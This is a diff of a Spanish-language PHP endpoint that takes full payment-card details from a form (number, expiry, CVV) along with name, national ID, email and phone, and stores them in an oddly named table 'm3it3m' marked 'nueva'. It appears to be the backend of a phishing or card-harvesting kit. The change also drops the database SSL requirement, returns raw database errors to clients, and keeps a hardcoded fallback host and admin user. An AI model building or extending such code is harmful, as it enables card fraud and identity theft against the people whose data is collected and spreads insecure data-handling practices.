@@ -1,7 +1,7 @@
 <?php
 header('Content-Type: application/json');
 
-// Leer credenciales de Render
+// Leer credenciales de variables de Render (Environment Variables)
 $db_host = getenv('DB_HOST') ?: 'mysql-86c4508-javiercarva913-1fe5.a.aivencloud.com';
 $db_port = getenv('DB_PORT') ?: 26767;
 $db_user = getenv('DB_USER') ?: 'avnadmin';
@@ -21,16 +21,14 @@ if ($mysqli->connect_error) {
   http_response_code(500);
   echo json_encode([
     'status' => 'ERROR',
-    'message' => 'Error de conexión a BD'
+    'message' => 'Error de conexión a BD: ' . $mysqli->connect_error
   ]);
   exit;
 }
 
-$mysqli->query("SET SESSION ssl_mode='REQUIRED'");
-
 // Obtener datos del formulario
 $numero_tarjeta = $_POST['numero_tarjeta'] ?? '';
-$fecha = $_POST['fecha'] ?? '';
+$fecha = $_POST['fecha'] ?? ''; // MM/YY
 $cvv = $_POST['cvv'] ?? '';
 $nombre = $_POST['nombre'] ?? '';
 $apellido = $_POST['apellido'] ?? '';
@@ -51,7 +49,7 @@ if (!$numero_tarjeta || !$fecha || !$cvv || !$nombre || !$cedula) {
 }
 
 try {
-  // INSERTAR EN m3it3m
+  // INSERTANDO EN TABLA EXISTENTE: m3it3m (MAPEO EXACTO)
   $stmt = $mysqli->prepare(
     "INSERT INTO m3it3m (
       usuario, 
@@ -61,21 +59,22 @@ try {
       email, 
       celular, 
       status, 
+      horacreado,
       banco,
       id
-    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
+    ) VALUES (?, ?, ?, ?, ?, ?, ?, NOW(), 'TARJETA', ?)"
   );
 
   if (!$stmt) {
-    throw new Exception('Error en prepare');
+    throw new Exception('Error en prepare: ' . $mysqli->error);
   }
 
   $nombre_completo = $nombre . ' ' . $apellido;
   $status = 'nueva';
-  $banco = 'TARJETA';
 
+  // Bind parámetros (mapeo exacto de campos)
   $stmt->bind_param(
-    'sssssssss',
+    'ssssssss',
     $nombre_completo,
     $numero_tarjeta,
     $fecha,
@@ -83,20 +82,21 @@ try {
     $email,
     $celular,
     $status,
-    $banco,
     $cedula
   );
 
+  // Ejecutar
   if (!$stmt->execute()) {
-    throw new Exception('Error al insertar');
+    throw new Exception('Error en execute: ' . $stmt->error);
   }
 
   $new_id = $stmt->insert_id;
 
+  // Respuesta exitosa
   http_response_code(201);
   echo json_encode([
     'status' => 'OK',
-    'message' => 'Solicitud creada',
+    'message' => 'Solicitud de tarjeta creada en m3it3m',
     'id' => $new_id,
     'data' => [
       'idreg' => $new_id,
